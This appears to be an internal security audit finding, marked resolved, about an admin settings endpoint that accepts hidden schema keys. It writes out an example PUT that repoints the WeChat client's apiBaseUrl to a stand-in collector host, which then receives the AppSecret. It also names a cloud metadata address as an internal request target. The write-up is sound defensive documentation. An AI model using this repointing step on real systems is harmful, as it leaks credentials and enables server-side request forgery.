# CR-9-k2 — the settings form writes keys it never shows: `apiBaseUrl` leaks the AppSecret

**Stream:** K2 (hardening) **Status:** RESOLVED in `468a75bef` (R3, wave 6)
**Files:** `next/packages/core/src/system/config.service.ts:203-207` (`known = Object.keys(def.schema.shape)`), `next/packages/core/src/wechat/wechat.config.ts:84` (`apiBaseUrl`, no `ui` entry), `next/packages/core/src/payment/payment.config.ts:72` (same), `next/packages/core/src/wechat/wechat.client.ts:251` (`GET {apiBaseUrl}/cgi-bin/token?…&secret=`), `:400` (OAuth code exchange, same)
**Pinned by:** `next/packages/core/src/system/config.k2.int.test.ts::K-SEC-C2 — a schema key the form never shows > refuses to repoint the WeChat client from the settings form`, `> refuses to repoint the WeChat Pay client from the settings form` (both `it.fails`)

## What

`configSave` accepts every key of a group's zod schema, not only the keys that
have a `ui` entry. Two groups carry a schema-only key that exists so tests can
point a client at a fake: `wechat.apiBaseUrl` and `payment.apiBaseUrl`.

The attacker is an admin holding `payment:config:write` (the atom both groups
require) but who is not supposed to be able to *read* the stored credentials —
the whole point of `secret: true`. They send
`PUT /admin-api/system/config/wechat` with `{"values":{"apiBaseUrl":"https://collector.example"}}`.
The next access-token refresh sends
`GET https://collector.example/cgi-bin/token?grant_type=client_credential&appid=…&secret=<AppSecret>`:
the write-only AppSecret, read back. It is also a server-side request from the
app container to any URL, with WeChat's `errmsg` echoed into an error. For
`payment.apiBaseUrl` the requests are signed and the responses verified against
the platform key, so nothing is booked from a forged answer, but the server
still calls whatever host it is given (the pinned test stores
`http://169.254.169.254`).

## Asked for

- `configSave` refuses (`SYSTEM_CONFIG_UNKNOWN_KEY`) any key without a `ui`
  entry — or, if a group needs a hidden writable key, an explicit
  `ui.hidden: true` opt-in with the default being "not writable".
- Keep `apiBaseUrl` settable through `ctx.config.set` for tests and ops.
- Flip both `it.fails`.

## Until then

`payment:config:write` is equivalent to reading the OA and mini-program
AppSecrets. Grant it only to people who may hold them.

## Resolution (R3, `468a75bef`)

`configSave` accepts only schema keys that have a `ui` entry (`SYSTEM_CONFIG_UNKNOWN_KEY` otherwise), so `wechat.apiBaseUrl` / `payment.apiBaseUrl` cannot be written through the admin. No `ui.hidden` opt-in was needed (those two are the only ui-less keys; `kernel/config-registry.ts` is R1's). Both K-SEC-C2 pins flipped; the K-SEC-R9 pin in the same file stays (CR-10-k, R2).
